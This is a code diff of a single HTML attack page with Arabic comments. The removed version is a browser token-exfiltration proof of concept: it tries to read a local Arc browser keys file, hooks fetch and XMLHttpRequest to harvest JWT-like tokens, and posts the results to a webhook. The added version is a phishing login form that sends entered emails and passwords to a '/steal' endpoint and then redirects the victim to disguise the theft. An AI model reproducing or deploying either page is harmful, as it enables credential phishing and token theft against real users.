@@ -1,90 +1,35 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PoC | Arc Token Exfiltration</title>
+  <meta charset="UTF-8" />
+  <title>Login</title>
 </head>
 <body>
-  <h1>Arc Exploit PoC</h1>
-  <p>Checking for tokens and local file access...</p>
+  <h2>Sign in</h2>
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Email" required /><br><br>
+    <input type="password" id="password" placeholder="Password" required /><br><br>
+    <button type="submit">Log In</button>
+  </form>
 
   <script>
-    // ✅ Webhook بتاعك هنا
-    const webhook = "https://eoq6u4lcr4rx56u.m.pipedream.net";
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
 
-    // 🔄 إرسال البيانات
-    function exfiltrate(data) {
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+      // قراءة القيم المدخلة
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // إرسال البيانات لسيرفرك
+      fetch('http://192.168.1.2:3000/steal', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
       }).catch(console.error);
-    }
 
-    // 🎯 محاولة قراءة ملف محلي حساس
-    fetch("file:///Users/macos/Library/Application Support/Arc/User Data/TrustTokenKeyCommitments/2025.5.15.1/keys.json")
-      .then(r => r.text())
-      .then(txt => {
-        exfiltrate({
-          type: "🧨 FILE READ SUCCESS",
-          file: "keys.json",
-          content: txt,
-          timestamp: new Date().toISOString()
-        });
-        alert("🚨 File Read Successful:\n" + txt.slice(0, 500));
-      })
-      .catch(err => {
-        exfiltrate({
-          type: "❌ FILE READ FAILED",
-          file: "keys.json",
-          error: String(err),
-          timestamp: new Date().toISOString()
-        });
-      });
-
-    // 🎣 Hook على fetch و XMLHttpRequest للـ Tokens
-    function inspectContent(content, source) {
-      try {
-        const regex = /([a-zA-Z0-9-_]{10,}\.[a-zA-Z0-9-_]{10,}\.[a-zA-Z0-9-_]{10,})/g; // JWT style
-        const found = content.match(regex);
-        if (found) {
-          exfiltrate({
-            type: "🔥 TOKEN FOUND",
-            source,
-            tokens: found,
-            full: content,
-            timestamp: new Date().toISOString()
-          });
-          console.warn(`🚨 TOKEN EXFILTRATED from ${source}`);
-        }
-      } catch (e) {}
-    }
-
-    const originalFetch = window.fetch;
-    window.fetch = async (...args) => {
-      const response = await originalFetch(...args);
-      const clone = response.clone();
-      clone.text().then(text => inspectContent(text, "fetch"));
-      return response;
-    };
-
-    const originalXHR = window.XMLHttpRequest;
-    window.XMLHttpRequest = function () {
-      const xhr = new originalXHR();
-      const open = xhr.open;
-      xhr.open = function (...args) {
-        this._url = args[1];
-        return open.apply(this, args);
-      };
-      const send = xhr.send;
-      xhr.send = function (...args) {
-        this.addEventListener("load", function () {
-          inspectContent(this.responseText, `XHR -> ${this._url}`);
-        });
-        return send.apply(this, args);
-      };
-      return xhr;
-    };
+      // يمكن توجه المستخدم بعد ما يكتب بياناته لأي صفحة حقيقية أو صفحة خطأ للتغطية
+      window.location.href = "https://real-login-page.com";
+    });
   </script>
 </body>
 </html>
